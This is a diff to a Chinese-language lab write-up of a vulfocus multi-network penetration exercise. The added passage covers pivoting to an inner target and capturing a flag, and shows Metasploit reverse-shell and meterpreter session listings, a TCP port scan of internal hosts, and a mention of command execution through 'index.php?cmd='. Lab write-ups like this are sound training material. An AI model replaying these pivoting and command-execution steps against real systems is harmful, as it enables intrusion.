@@ -301,99 +301,9 @@ flag-{bmh20c56a41-fc29-44f1-9da4-0e3b7bbfb8ff}
 
 ![](img/getflag2.png)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ### 多网段渗透场景攻防
 
-#### 外层（靶机1）
+#### 外层（靶机 1）
 
 从模拟显示的角度来考虑，最外层的主机负责对外提供服务，于是直接得到了提供服务的端口号，也就是vulfocus平台上场景的入口端口
 
@@ -543,27 +453,46 @@ msf6 post(multi/gather/ping_sweep) > run
 [*] Post module execution completed
 ```
 
-
-
-
+#### 内层（靶机 5）
 
 ##### nginx-php-flag
 
+内层一样需要找到跳板主机访问到内层网络，通过升级普通会话到meterpreter，随后搭建autoroute添加路由表，随后进行存活性扫描，再者是端口扫描。
 
+首先是升级会话和找到连接内层网络的跳板主机，这里因为开太多容器和虚拟机的问题回连速度略慢导致产生了报错，即前一会话仍在等待4433端口的回应时下一会话的payload已经发送过去导致本地端口冲突了，不过不影响，使用`jobs -l`确认后台执行完成后3个会话都升级到了meterpreter：
 
+```shell
+  Id  Name  Type                   Information          Connection
+  --  ----  ----                   -----------          ----------
+  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
+  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)
+  3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60640 (192.171.84.2)
+  4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60630 (192.171.84.3)
+  5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60574 (192.171.84.5)
+  6         meterpreter x86/linux  root @ 192.171.84.2  192.168.56.107:4433 -> 192.168.56.1:60622 (192.171.84.2)
 
+msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 6
+[*] Starting interaction with 6...
+```
 
+得到输出结果，并且提示我们需要通过 `index.php?cmd=ls /tmp` 的方式执行，最后成功得到 `flag5`：
 
+```shell
+View the full module info with the info, or info -d command.
 
+msf6 auxiliary(scanner/portscan/tcp) > set ports 80
+ports => 80
+msf6 auxiliary(scanner/portscan/tcp) > set rhosts 192.172.85.2-3
+rhosts => 192.172.85.2-3
+msf6 auxiliary(scanner/portscan/tcp) > run
 
+[+] 192.172.85.2:         - 192.172.85.2:80 - TCP OPEN
+[*] 192.172.85.2-3:       - Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/portscan/tcp) >
+```
 
-
-
-
-
-
-
-
+![completed](img/completed.png)
 
 ### 漏洞威胁监测和缓解修复
 
@@ -757,4 +686,7 @@ Getshell脚本的反弹命令需要进行进行编码转换，所以反弹shell�
 - [关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告（第二版）](https://www.cnvd.org.cn/webinfo/show/4999)
 - [Oracle Security Alert Advisory - CVE-2019-2725](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)
 - [Long Term Persistence of JavaBeans Components: XML Schema](https://www.oracle.com/technical-resources/articles/java/persistence3.html)
-
+- [2725 : Deserialization vulnerability in Oracle WebLogic Server](https://www.rapid7.com/db/vulnerabilities/oracle-weblogic-cve-2019-2725/)
+- [How To Remove Docker Images, Containers, and Volumes | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-remove-docker-images-containers-and-volumes)
+- [Struts2 S2-061 Remote Code Execution Vulnerability (CVE-2020-17530) Threat Alert - NSFOCUS, Inc., a global network and cyber security leader, protects enterprises and carriers from advanced cyber attacks.](https://nsfocusglobal.com/struts2-s2-061-remote-code-execution-vulnerability-cve-2020-17530-threat-alert/)
+- [Oracle WebLogic Affected by Unauthenticated Remote Code Execution Vulnerability (CVE-2019-2725)](https://www.tenable.com/blog/oracle-weblogic-affected-by-unauthenticated-remote-code-execution-vulnerability-cve-2019-2725)
